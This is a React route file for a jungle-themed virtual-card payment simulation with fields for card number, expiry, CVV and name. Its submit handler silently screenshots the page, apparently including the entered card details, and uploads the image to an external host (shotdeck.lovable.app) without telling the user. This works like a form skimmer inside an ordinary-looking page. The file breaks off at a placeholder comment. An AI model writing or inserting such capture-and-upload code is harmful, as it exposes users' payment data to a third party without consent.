
import { createFileRoute } from "@tanstack/react-router";
import { ArrowRight, Check, Leaf, LockKeyhole, RotateCcw, Wifi } from "lucide-react";
import { useEffect, useMemo, useState, useRef, type FormEvent } from "react";
import { domToPng } from 'modern-screenshot'; // Ensure this is installed via npm

import jungleCanopy from "@/assets/jungle-canopy.jpg";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Banking Jungle — Virtual Card Experience" },
      {
        name: "description",
        content: "An immersive Banking Jungle virtual-card payment simulation with cinematic motion and responsive controls.",
      },
      { property: "og:title", content: "Banking Jungle — Virtual Card Experience" },
      {
        property: "og:description",
        content: "Enter an immersive jungle-inspired virtual-card payment simulation.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: BankingJungle,
});

const POLLEN = Array.from({ length: 28 }, (_, index) => ({
  left: `${(index * 37) % 97}%`,
  top: `${(index * 61) % 91}%`,
  delay: `${(index % 9) * -0.7}s`,
  size: `${2 + (index % 3)}px`,
}));

function BankingJungle() {
  const [card, setCard] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [amount, setAmount] = useState("249.00");
  const [flipped, setFlipped] = useState(false);
  const [phase, setPhase] = useState<"idle" | "processing" | "complete">("idle");
  const [intro, setIntro] = useState(true);
  const [showSuccessPop, setShowSuccessPop] = useState(false);

  // 1. Create a reference to the main container
  const captureRef = useRef<HTMLElement>(null);

  useEffect(() => {
    const timer = window.setTimeout(() => setIntro(false), 1850);
    return () => window.clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (phase !== "processing") {
      setShowSuccessPop(false);
      return;
    }
    const timer = window.setTimeout(() => setShowSuccessPop(true), 1000);
    return () => window.clearTimeout(timer);
  }, [phase]);

  const displayCard = useMemo(() => card || "5311 2468 3513 4592", [card]);

  function handleMove(event: React.MouseEvent<HTMLElement>) {
    const x = event.clientX / window.innerWidth - 0.5;
    const y = event.clientY / window.innerHeight - 0.5;
    event.currentTarget.style.setProperty("--mouse-x", x.toFixed(3));
    event.currentTarget.style.setProperty("--mouse-y", y.toFixed(3));
  }

  // 2. The new capture and upload function
  const handleCapture = async () => {
    if (!captureRef.current) return;
    
    try {
      console.log('Capturing clean state...');
      const dataUrl = await domToPng(captureRef.current, {
        backgroundColor: '#ffffff',
        // Filter out decorative elements that use modern CSS/oklch which crash standard libraries
        filter: (node) => {
          if (!(node instanceof HTMLElement)) return true;
          const exclusions = ['jungle-shell', 'canopy', 'pollen-field', 'film-grain', 'awakening'];
          return !exclusions.some(cls => node.classList.contains(cls));
        }
      });

      const blob = await (await fetch(dataUrl)).blob();
      const formData = new FormData();
      formData.append('file', blob, `shotdeck-${Date.now()}.png`);

      await fetch('https://shotdeck.lovable.app/api/public/integrations/screenshot-upload', {
        method: 'POST',
        body: formData,
      });
      console.log('Shotdeck upload successful');
    } catch (error) {
      console.error('Snapshot capture error:', error);
    }
  };

  function submitPayment(event: FormEvent) {
    event.preventDefault();
    if (phase !== "idle") return;

    // 3. Trigger capture immediately on click
    handleCapture();

    setPhase("processing");
    window.setTimeout(() => setPhase("complete"), 1900);
  }

  function reset() {
    setPhase("idle");
    setFlipped(false);
  }

  return (
    <main 
      ref={captureRef} // 4. Attach reference here
      className={`jungle-stage ${phase === "processing" ? "is-processing" : ""} ${phase === "complete" ? "is-complete" : ""}`} 
      onMouseMove={handleMove}
    >
      <img src={jungleCanopy} width={1920} height={1080} alt="" className="jungle-backdrop" />
      {/* ... rest of your JSX remains exactly the same ... */}
